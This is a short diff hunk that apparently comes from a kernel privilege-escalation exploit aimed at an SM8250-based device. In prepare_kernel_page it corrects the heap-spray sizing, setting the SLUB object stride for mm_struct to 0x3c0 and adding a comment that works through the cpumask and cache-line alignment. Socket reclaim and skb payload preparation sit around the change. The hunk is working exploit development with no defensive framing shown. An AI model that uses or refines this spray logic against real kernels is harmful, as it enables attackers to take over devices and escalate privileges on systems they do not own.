@@ -1199,7 +1199,10 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
 uintptr_t prepare_kernel_page(int payload_mode) {
   close_reclaim_sockets();
-  mm_objs_per_slab = ORDER3_SIZE / 0x388; /* spray sizing uses real mm_struct size */
+  /* SLUB object stride, not logical mm_struct size: 0x388 + 8-byte
+   * cpumask (CONFIG_NR_CPUS=8) = 0x390 request, HWCACHE_ALIGN to the
+   * SM8250 64-byte cache line -> 0x3c0 (see rt-waiter-placement-audit.md). */
+  mm_objs_per_slab = ORDER3_SIZE / 0x3c0;
   prepare_ctxs();
 
   skb_buf = malloc(SKB_SEND_SIZE);
